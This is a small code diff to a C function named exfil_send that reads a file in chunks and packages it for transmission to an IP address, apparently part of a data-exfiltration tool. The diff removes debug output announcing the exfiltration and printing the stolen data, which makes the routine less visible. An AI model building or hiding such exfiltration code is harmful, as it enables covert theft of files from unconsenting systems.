@@ -210,8 +210,6 @@ void exfil_send(uint32 ipaddr, char *path)
 
 	file = open_file(path, FALSE);
 
-	printf("Starting Exfil: %s\n", path);
-
 	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
 	{
 		char *trans;
@@ -220,8 +218,6 @@ void exfil_send(uint32 ipaddr, char *path)
 		tot_len = buflen + 1;
 
 		trans = buildTransmission(buffer, &tot_len, XFL_TYP);
-
-		printf("Data: %s\n", buffer);
 
 		for (int i = 0; i < tot_len; i += 8)
 		{
